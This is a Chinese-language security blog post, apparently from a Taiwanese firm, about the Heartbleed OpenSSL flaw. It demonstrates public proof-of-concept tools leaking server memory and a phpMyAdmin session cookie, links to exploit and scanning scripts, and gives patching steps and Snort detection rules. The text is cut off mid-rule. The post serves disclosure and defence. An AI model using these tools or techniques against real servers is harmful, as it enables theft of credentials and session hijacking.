                <description>&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;這幾天不少企業、民眾都不斷來詢問我們相對應的解決方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed 跟我有關嗎？我該怎麼知道？&lt;/li&gt;
  &lt;li&gt;我該怎麼更新 OpenSSL？&lt;/li&gt;
  &lt;li&gt;我如果不能更新，要怎麼防止攻擊？&lt;/li&gt;
  &lt;li&gt;Heartbleed 漏洞攻擊者會怎麼利用？&lt;/li&gt;
  &lt;li&gt;目前受害的狀況如何？&lt;/li&gt;
  &lt;li&gt;我只是一般民眾，該如何應對？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我相信不少人都有類似的疑問，我們以這篇專文補遺上次沒提到的資訊。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;攻擊手法示範&quot;&gt;攻擊手法示範&lt;/h3&gt;

&lt;p&gt;大家都說 OpenSSL Heartbleed 漏洞可望為本年度最嚴重的漏洞，到底有多嚴重呢？我相信沒有看到攻擊的範例是沒有感覺的。大家可以先看看以下的影片，利用最先釋出的兩個簡單的 PoC exploit （弱點利用程式）「ssltest.py」以及「check-ssl-heartbleed.pl」，來檢測伺服器是否有 Heartbleed 問題。檢測的同時可以獲取伺服器記憶體中的資訊，其中就可能包含了機敏資訊。&lt;/p&gt;

&lt;p&gt;讓我們來看看吧！&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;首先利用 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; 來測試，來看伺服器是否有被 heartbleed 漏洞影響，fbi.gov 在第三天已經修復這個問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; title=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果是檢測一個有漏洞的網站，這個工具會直接把記憶體的內容顯示出來，其中可能包括 http 傳輸的資料、帳號密碼、私密金鑰等。在這個例子中，攻擊程式讀取到使用者送出的 form，若其中包含個資將會被一覽無遺，非常危險。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; title=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一個工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; 可以使用 -R 參數做更有效的利用。直接執行指令可以快速顯示伺服器有無問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; title=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果使用「-R」參數並且指定特定的正規表示式，可以抓出想要獲取的資料。例如 Cookie、帳號密碼等。以此例，我們知道這個網站提供 &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; 套件，因此直接鎖定「pmaPass」資料來抓取，沒想到第一次就抓到了。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; title=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著攻擊者只要把這個獲取到的 Cookie 存入自己的瀏覽器中，就可以如影片中盜用這個帳號。是否很危險呢？&lt;/p&gt;

&lt;p&gt;除了這種利用方法之外，還有更多情況是直接把使用者登入的帳號密碼直接顯示出來的，因此如果伺服器沒有做好防禦或更新，整個網站的使用者資料都可以因此外洩。這也是為什麼我們一直強調伺服器管理者必須要更新金鑰、全站使用者帳號密碼等，以防有心人士借此撈取資料。&lt;/p&gt;

&lt;h3 id=&quot;誰在利用-heartbleed-漏洞竊取資料呢&quot;&gt;誰在利用 Heartbleed 漏洞竊取資料呢？&lt;/h3&gt;

&lt;p&gt;由 github 上面的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit 記錄&lt;/a&gt;，出問題的那行程式碼是在 2011-12-31 22:59:57 commit 的，不知道是開發者太累還是 NSA 的陰謀。根據 Bloomberg 的&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;報導&lt;/a&gt;指出，知情人士表示 NSA 早在&lt;strong&gt;兩年前&lt;/strong&gt;就已經知道此漏洞，並且&lt;strong&gt;利用這個漏洞竊取許多網站的機敏資料&lt;/strong&gt;。這代表 NSA 在一開始就知道這個漏洞，令人不禁有其他聯想。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在之前&lt;a href=&quot;http://hitcon.org&quot;&gt;台灣駭客年會 (HITCON)&lt;/a&gt; 2013 的講師 Rahul Sasi (Garage4Hackers) 公布了&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;大量掃描 Heartbleed 漏洞的程式&lt;/a&gt;，也可以供研究人員自行研究，或者是尋找自己管理的主機中有多少包含這個風險的。&lt;/p&gt;

&lt;h3 id=&quot;常見問題&quot;&gt;常見問題&lt;/h3&gt;

&lt;h3 id=&quot;openssl-是什麼iis-會受-heartbleed-漏洞影響嗎&quot;&gt;OpenSSL 是什麼？IIS 會受 Heartbleed 漏洞影響嗎？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; 是一個函式庫（Library），在 UNIX 系列的服務若有使用 SSL，通常都會使用 OpenSSL。因此這次的漏洞並未影響微軟 IIS。&lt;/p&gt;

&lt;h3 id=&quot;我使用-openssl-098太好了我用舊版我好安全&quot;&gt;我使用 OpenSSL 0.9.8，太好了我用舊版我好安全！&lt;/h3&gt;

&lt;p&gt;你聽過 &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; 嗎？&lt;/p&gt;

&lt;h3 id=&quot;我沒有使用-https所以我很安全&quot;&gt;我沒有使用 HTTPS，所以我很安全！&lt;/h3&gt;

&lt;p&gt;。。。&lt;/p&gt;

&lt;h3 id=&quot;只有網頁伺服器http-server會受影響嗎&quot;&gt;只有網頁伺服器（HTTP Server）會受影響嗎？&lt;/h3&gt;

&lt;p&gt;不只！只要使用 OpenSSL 支援 STARTTLS 的服務都在影響範圍，包括 HTTPS、IMAPS、POPS、SMTPS 等伺服器。&lt;/p&gt;

&lt;h3 id=&quot;只有自己架設的伺服器會受影響嗎&quot;&gt;只有自己架設的伺服器會受影響嗎？&lt;/h3&gt;

&lt;p&gt;當然不只！目前已經出現各大設備廠商都遭遇到這樣的問題。各大設備廠商、作業系統等影響狀況，可以參閱以下文章。&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;廠商的設備目前狀況特別嚴重，因為所有同個版本的設備都會受影響，而在廠商釋出更新之前，只能被動的等待更新。若沒有繼續簽訂維護約的設備，也只能繼續跟廠商簽約更新，或者是看廠商是否可以直接提供更新檔。如果有 VPN Server 等服務更要注意，如果被攻擊者取得帳號密碼，等於如入無人之境，直接使用你的帳號登入到企業內網，不可不慎。&lt;/p&gt;

&lt;h3 id=&quot;各家系統更新的速度&quot;&gt;各家系統更新的速度？&lt;/h3&gt;

&lt;p&gt;引述自好朋友 Ant 的&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;文章&lt;/a&gt;，各家作業系統、網站的更新速度，代表著企業重視資安的程度以及針對資安事件緊急應變的效率，也可以作為我們挑選系統、網站、廠商的依據。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;二、作業系統的更新進度&lt;/p&gt;

  &lt;p&gt;從資安事件的處理可以推敲出各作業系統商對於緊急事件的反應速度。
時間軸，按照修復的先後排列：&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (資安弱點的主角) 第一次公開揭露的時間約在 2014年4月6日 0時。&lt;/li&gt;
    &lt;li&gt;RedHat 在 2014年4月7日 07:47:00 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSSL 正式確認並修復的時間約在 2014年4月7日16時。&lt;/li&gt;
    &lt;li&gt;OpenBSD 約在 2014年4月7日 20:17 正式修復。&lt;/li&gt;
    &lt;li&gt;Arch Linux 約在 2014年4月7日 20:36 正式修復。&lt;/li&gt;
    &lt;li&gt;Debian 約在 2014年4月7日 21:45 正式修復。&lt;/li&gt;
    &lt;li&gt;FreeBSD 約在 2014年4月7日 21:46 正式修復。&lt;/li&gt;
    &lt;li&gt;Ubuntu 約在 2014年4月7日 21:48 正式修復。
(2014年4月8日分隔區)&lt;/li&gt;
    &lt;li&gt;Fedora 約在 2014年4月8日 00:33 正式修復。&lt;/li&gt;
    &lt;li&gt;CentOS 約在 2014年4月8日 02:49 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSUSE 約在 2014年4月8日 05:32 正式修復。&lt;/li&gt;
    &lt;li&gt;Scentific 約在 2014年4月8日 08:27 正式修復。&lt;/li&gt;
    &lt;li&gt;Gentoo 約在 2014年4月8日 09:36 正式修復。&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;重點整理：&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;RedHat 修復的速度比 OpenSSL 官方還快。&lt;/li&gt;
    &lt;li&gt;RedHat 派系的修復時間，除了 RedHat 外都算慢，如 Fedora 及 CentOS、Scentific，他們都比 RedHat 慢 16 小時以上。&lt;/li&gt;
    &lt;li&gt;Debian 派系的修復時間，如 Debian 及 Ubuntu，都比 RedHat 慢上至少 12 小時以上。&lt;/li&gt;
    &lt;li&gt;Gentoo 是列表中修復最慢的。&lt;/li&gt;
    &lt;li&gt;若以資安黃金 6 小時來說，Fedora、CentOS、OpenSUSE、Scentific 及 Gentoo 都不及格。&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;三、大公司更新的速度&lt;/p&gt;

  &lt;p&gt;同樣地，從資安事件的處理可以推敲出各公司對於緊急事件的反應速度。&lt;/p&gt;

  &lt;p&gt;雲端相關公司&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Cloudflare 約在 2014年4月7日 11時修復。&lt;/li&gt;
    &lt;li&gt;DigitalOcean 約在 2014年4月8日 12時修復。&lt;/li&gt;
    &lt;li&gt;AWS 約在 2014年4月8日 12時修復。&lt;/li&gt;
    &lt;li&gt;Linode 約在 2014年4月8日 14時修復。&lt;/li&gt;
    &lt;li&gt;Heroku 約在 2014年4月8日 16時修復。&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;有些公司直到 2014年4月8日 16時都還沒修復。此時已離官方正式修復整整一天，也比上述機器數很多的雲端相關公司還慢。這些公司為，&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Yahoo.com / Flickr.com&lt;/li&gt;
    &lt;li&gt;Kaspersky.com (資安公司)&lt;/li&gt;
    &lt;li&gt;stackoverflow.com&lt;/li&gt;
    &lt;li&gt;stackexchange .com&lt;/li&gt;
    &lt;li&gt;php.net&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;感謝 StackNG 的補充：Cloudflare 於 2014 年 4 月 7 日 11 時公告，但在漏洞公告之前已經修復。&lt;/p&gt;

&lt;h3 id=&quot;目前還有哪些伺服器有問題呢&quot;&gt;目前還有哪些伺服器有問題呢？&lt;/h3&gt;

&lt;p&gt;根據 &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; 的&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;研究報告&lt;/a&gt;指出，他們針對 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 前一百萬個網站&lt;/a&gt;進行檢測，大約有 36% 的伺服器支援 TLS、7.6% 的伺服器含有此漏洞。ZMap 並提供了一個&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;完整的清單&lt;/a&gt;列出在 2014/4/11 17:00 尚未修復漏洞的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;有什麼值得測試的網站呢&quot;&gt;有什麼值得測試的網站呢？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;我要怎麼更新-openssl-呢&quot;&gt;我要怎麼更新 OpenSSL 呢？&lt;/h3&gt;

&lt;p&gt;根據不同的 Linux Distribution 有不同的更新方式，若有自己客製化一些程式設定，可能就需要自行更新。以下我們簡單介紹更新步驟：&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora 系列更新套件：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum update
yum update openssl #只更新 OpenSSL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian / Ubuntu 系列更新套件：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若只要更新 OpenSSL 則可以執行以下指令&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意 OpenSSL 是否已經更新為修復的版本：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接著請記得撤銷原本的簽章金鑰，重新簽署，並記得提交 CSR (Certificate Signing Request) 給 CA (Certification Authority)。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;結束後記得重新啟動相關服務&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後再使用檢測工具看自己的網頁伺服器或其他相關服務是否已經不在漏洞受害範圍。&lt;/p&gt;

&lt;h3 id=&quot;我無法更新我的伺服器我該怎麼在-ids-偵測攻擊呢&quot;&gt;我無法更新我的伺服器，我該怎麼在 IDS 偵測攻擊呢？&lt;/h3&gt;

&lt;p&gt;若你使用 Snort IDS，官方已經釋出 SID 30510 到 30517 來偵測，並且在 Community Rules 中也有包含。
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;SIDs 30510 through 30517 address detection of the heartbleed attack 
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL SSLv3 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 00|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30510; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 01|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30511; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 02|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30512; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.2 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 03|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30513; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER SSLv3 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 00|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30514; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 01|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30515; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.1 large 
